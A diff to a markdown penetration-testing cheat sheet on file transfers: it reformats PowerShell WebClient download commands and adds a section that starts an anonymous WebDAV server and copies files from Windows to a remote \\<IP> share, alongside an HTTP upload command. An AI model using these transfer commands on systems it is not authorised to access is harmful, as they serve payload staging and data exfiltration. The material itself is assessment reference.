@@ -14,15 +14,17 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
         <summary><strong>PowerShell Downloads</strong></summary>  
         <details> 
         <summary><strong>PowerShell DownloadFile Method</strong></summary>
-          Sync  
-          ```powershell
-          (New-Object Net.WebClient).DownloadFile('<FILE URL>','<OUTPUT FILE>')
-          ```
-            Async  
-            ```powershell
-            (New-Object Net.WebClient).DownloadFileAsync('<FILE URL>','<OUTPUT FILE>')
-            ```
-        </details>
+          
+  Sync  
+  ```powershell
+  (New-Object Net.WebClient).DownloadFile('<FILE URL>','<OUTPUT FILE>')
+  ```
+  Async  
+  ```powershell
+  (New-Object Net.WebClient).DownloadFileAsync('<FILE URL>','<OUTPUT FILE>')
+  ```
+          
+  </details>
 
   <details>
     <summary><strong>PowerShell DownloadString - Fileless Method</strong></summary>
@@ -181,6 +183,24 @@ Invoke-FileUpload -Uri http://<IP>:<PORT>/upload -File <FILE PATH>
   echo <BASE64 FILE> | base64 -d -w 0 > <FILE>
   ```
   </details>
+  </details>
+  <details> 
+  <summary><strong>SMB Uploads</strong></summary>  
+
+  1. Installing WebDav Python modules in Linux
+  ```bash
+  sudo pip3 install wsgidav cheroot
+  sudo wsgidav --host=0.0.0.0 --port=<PORT> --root=/tmp --auth=anonymous
+  ```
+  2. Uploading Files using SMB in Windows
+  ```cmd
+  # DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server.
+  dir \\192.168.49.128\DavWWWRoot
+  copy <FILE PATH> \\<IP>\DavWWWRoot\
+
+# You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \<IP>\sharefolder
+  copy <FILE PATH> \\<IP>\sharefolder\
+  ```
   </details>
   </details>
 </details>
